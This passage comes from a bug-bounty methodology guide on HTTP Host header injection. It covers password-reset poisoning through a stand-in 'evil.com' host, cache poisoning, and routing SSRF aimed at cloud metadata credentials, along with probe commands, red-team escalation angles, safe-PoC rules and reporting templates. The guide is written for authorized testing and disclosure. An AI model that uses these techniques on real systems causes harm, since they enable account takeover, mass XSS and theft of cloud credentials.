- **Escalate:** confirm with your own account (link → evil.com/reset?token=) → password-reset poisoning → ATO (§11). Try `X-Forwarded-Host` if `Host` is fixed.
- **Evidence:** your reset email's link pointing to your host + the token arriving there.
- **Severity:** **High** (Critical if no click needed).

### 18.3 You found: *Host reflected + the page is cached*
- **Escalate:** confirm unkeyed (Param Miner) → poison with an XSS/redirect on a benign cache key → mass impact (§12).
- **Evidence:** the poisoned response served from cache (X-Cache: hit) with your benign marker.
- **Severity:** **High–Critical**.

### 18.4 You found: *changing Host changes the backend*
- **Escalate:** routing SSRF → internal services / `169.254.169.254` metadata → IAM creds → cloud/RCE (§13; SSRF kit).
- **Evidence:** internal content / an OOB hit from the front-end / metadata creds (read-only proof).
- **Severity:** **Critical**.

### 18.5 You found: *`Host` validated but `X-Forwarded-Host` trusted*
- **Escalate:** drive the forwarding header into whichever sink exists (reset/cache/routing) (§7 → §11/§12/§13).
- **Evidence:** the sink impact achieved via the forwarding header.
- **Severity:** matches the sink.

---

# 19. Building a Professional, Safe PoC

```
DO:
  □ Reset-poisoning: use YOUR OWN test account; show the email link host = your domain and the token arriving there.
    Never trigger resets for real users.
  □ Cache poisoning: prove on a NON-shared cache key (a unique path/query) with a BENIGN marker (a harmless string /
    alert(document.domain) in your own view); then DESCRIBE the shared-cache impact. Don't poison high-traffic pages.
  □ Routing SSRF: use YOUR OWN OOB host; for metadata, retrieve creds and prove with read-only sts get-caller-identity, then STOP (SSRF kit §23).
  □ Capture: the exact request + headers, and the evidence (email link / cached response with X-Cache / internal content / OOB).
DON'T:
  □ Poison a shared/production cache that serves real users, or leave a poisoned entry in place.
  □ Trigger password resets for accounts you don't own, or read real users' tokens.
  □ Use stolen metadata creds against real data (get-caller-identity is enough).
  □ Report a bare reflected/accepted header with no demonstrated sink impact.
```
> The single most important restraint: **own accounts for reset-poisoning, benign markers on non-shared cache keys, read-only for metadata — then stop.** You can demonstrate every Host-header impact without harming real users. Same discipline as the CORS/SSRF guides.

**Remediation to include:** don't trust the Host/forwarding headers for security decisions — use a **server-configured canonical domain** for building absolute URLs (reset links, redirects); validate `Host` against an **allowlist** and reject/normalize unknown values (and **ignore** `X-Forwarded-Host`/`X-Host`/`Forwarded` unless from a trusted proxy); include the relevant headers in the **cache key** (or strip them); don't route to arbitrary backends based on a client header; for OAuth, use **pre-registered** redirect URIs.

---

# 20. Reporting, CWE/CVSS & De-duplication

Use `HOST_HEADER_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Host header injection → password-reset poisoning → account takeover" (or cache poisoning / routing SSRF) — name IMPACT
2. Severity     CVSS 3.1 vector + score + CWE-644 (+ CWE-640/79/918 by outcome)
3. Asset        exact endpoint + which header (Host/X-Forwarded-Host/…) + the sink
4. Summary      how you control the host, where it lands, what it does
5. Steps        numbered: the request w/ header → the sink evidence (email link / cached response / internal content)
6. PoC          the poisoned email (own account) / the cached poisoned response (X-Cache:hit) / the OOB or metadata proof
7. Impact       ATO / mass XSS / internal-cloud reach (→ RCE) — the "so what"
8. Remediation  canonical domain + Host allowlist + ignore forwarding headers + cache-key the header (§19)
```
**De-dup:** one root cause (trusting the host) = one finding even if it hits multiple sinks; lead with the highest-impact sink. Don't split "Host reflected" and "reset poisoning" — one report. Distinct mechanisms (reset-poisoning vs a separate routing SSRF) can be separate.

---

# 21. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/hosthdr_probe.py -u https://target/                 # spoofing-header set + reflection detection
python3 poc/cache_poison.py -u https://target/ --header X-Forwarded-Host
python3 poc/reset_poison.py -u https://target/reset --email you@yourdomain.com   # own-account reset-poison check
# Burp: Param Miner (unkeyed headers / cache poisoning), and inject X-Forwarded-Host across all requests.
nuclei -l live.txt -tags host-header -o hh.txt
```
- **Quality gate:** never submit "X-Forwarded-Host is accepted." Reproduce the **sink impact** by hand — a poisoned reset email (own account), a cached XSS (benign marker, non-shared key), or internal reach — and prove it safely (§19).

**Red-team angles:**
```
□ Reset-poisoning of an ADMIN account → admin code-exec feature → RCE.
□ Cache-poisoned stored XSS targeting admins → admin session → internal pivot.
□ Routing SSRF (Host: 169.254.169.254 / internal) → metadata creds → cloud takeover (SSRF kit).
□ X-Forwarded-Host trusted behind a CDN even when Host is locked — the universal bypass.
□ Host/SNI desync overlaps with request smuggling — see that kit for front-end/back-end discrepancies.
□ OAuth callback poisoning via Host → token theft → ATO.
```

---

# Appendix A — Host-Header Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                   HOST HEADER INJECTION WORKFLOW                  │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: sinks that USE the host — reset/verify links, redirects, │
│    cache, vhost routing, SSO callbacks §3                          │
│ 1. BASELINE ★ : can I change the effective host (Host /            │
│    X-Forwarded-Host / dup / absolute URI)? does it reach a sink? §4│
│ 2. INJECT/BYPASS: header set §5 · reflect-vs-trust §6 ·            │
│    bypass validation (X-Forwarded-Host/dup/absolute/wrap) §7       │
│ 3. IMPACT ⭐ (map sink → attack §8):                                │
│    PASSWORD-RESET POISONING → ATO ................. §11 ⭐⭐⭐       │
│    CACHE POISONING → mass stored XSS/redirect ..... §12 ⭐⭐⭐       │
│    ROUTING SSRF → internal/metadata → RCE/cloud ... §13 ⭐⭐⭐       │
│    absolute-redirect/link poison .................. §9             │
│    reflected-host XSS .............................. §10           │
│    SSO/OAuth callback / authz ..................... §14            │
│ 4. VALIDATE → REPORT:                                             │
│    FP filter §16 (reflection≠impact) · CVSS+CWE-644 §17          │
│    SAFE PoC: own accounts, benign markers, non-shared key §19    │
│    title = IMPACT (ATO/mass-XSS/SSRF), dedup §20                 │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Host-Header Decision Tree

```
Set Host: evil.com (and X-Forwarded-Host: evil.com) (§4) →
│
├─ Rejected (400 / canonical redirect)? → try X-Forwarded-Host / dup Host / absolute URI / wrap (§7). Still nothing? likely safe.
│
├─ Accepted/used → WHERE does the host land?
│
├─ In a password-reset / verify EMAIL link? → reset-poisoning → ATO (§11). HIGH (Critical if no click). ⭐
│
├─ Reflected in a CACHEABLE response (Age/X-Cache) + UNKEYED header? → cache poisoning →
│       stored XSS / mass redirect for all users (§12). HIGH–CRITICAL. ⭐
│
├─ Changes which BACKEND answers (routing)? → routing SSRF →
│       Host: 169.254.169.254 → metadata IAM creds → cloud/RCE ; internal admin → RCE (§13/§13.1). CRITICAL. ⭐
│
├─ In an absolute REDIRECT / OAuth callback? → open redirect / token theft → ATO (§9/§14). MEDIUM–HIGH.
│
├─ Reflected UNENCODED in HTML? → reflected XSS (§10) → cache-poisoned stored XSS if cached. MEDIUM–HIGH.
│
└─ Reflected but NO security use? → Low/Info (§16). Keep hunting for a real sink.

ALWAYS: prove the SINK impact (poisoned email / cached XSS / internal reach), use own accounts + benign markers (§19).
```

---

# Appendix C — Important Links & References

**Primary (learn + labs)**
- PortSwigger Web Security Academy — *HTTP Host header attacks* (theory + labs): https://portswigger.net/web-security/host-header
- PortSwigger Web Security Academy — *Web cache poisoning*: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger Web Security Academy — *Web cache deception* (the §12.2 twin): https://portswigger.net/web-security/web-cache-deception
- OWASP WSTG — *Testing for Host Header Injection*: https://owasp.org/www-project-web-security-testing-guide/
- HackTricks — *Host header injection* + *Cache deception*: https://book.hacktricks.xyz/pentesting-web/cache-deception
- PayloadsAllTheThings — *Request smuggling / Host header*: https://github.com/swisskyrepo/PayloadsAllTheThings
- PentesterLab — Host-header / cache exercises: https://pentesterlab.com/

**Foundational research & talks (the class-defining work)**
- **James Kettle (PortSwigger Research) — "Practical Web Cache Poisoning"**: https://portswigger.net/research/practical-web-cache-poisoning
- **James Kettle — "Cracking the Lens: Targeting HTTP's Hidden Attack-Surface"** (routing-based SSRF via Host, Black Hat/DEF CON 2017): https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- **James Kettle — "Web Cache Entanglement"** (advanced cache-key exploitation): https://portswigger.net/research/web-cache-entanglement
- **Omer Gil — "Web Cache Deception Attack"** (Black Hat USA 2017 — the WCD origin, §12.2).
- PortSwigger Research index (Host / cache / smuggling): https://portswigger.net/research

**Real-world / bug-bounty writeups**
- Disclosed HackerOne / Bugcrowd reports — search *"host header → account takeover"*, *"password reset poisoning"*, *"web cache poisoning"*, *"web cache deception"*.
- **Django `ALLOWED_HOSTS`** misconfig → reset-poisoning of absolute URLs; Rails/Laravel/custom-mailer reset-poisoning.

**Tools**
- Burp *Param Miner* (unkeyed-header / cache-poisoning detection): https://github.com/PortSwigger/param-miner
- Burp *HTTP Request Smuggler* (duplicate-Host / `:authority` desync) · Nuclei (`-tags host-header`) · this kit's `poc/` (hosthdr_probe / reset_poison / cache_poison / wcd_test).

**CWE / standards to cite**
- **CWE-644** (Improper Neutralization of HTTP Headers) · **CWE-640** (Weak Password Recovery) · CWE-444 / CWE-349 (cache / request-interpretation) · CWE-918 (routing SSRF) · CWE-79 (cache-poisoned XSS) · CWE-200 (WCD data exposure): https://cwe.mitre.org/

---

> **Final reminder — the one rule that pays:** *A Host-header bug is only a finding when the host you control reaches a **security sink** and produces real harm — a poisoned reset email (ATO), a cached payload served to everyone (mass XSS/redirect), or an internal/metadata fetch (SSRF → RCE/cloud).* A reflected or merely accepted header is **Low/Info**. Find the sink, bypass `Host` validation with `X-Forwarded-Host`/duplicates/absolute-URI, prove the impact with your own accounts and benign markers, and report the ATO/mass-XSS/SSRF — not the header. That's how a one-line header becomes the Critical it's worth.
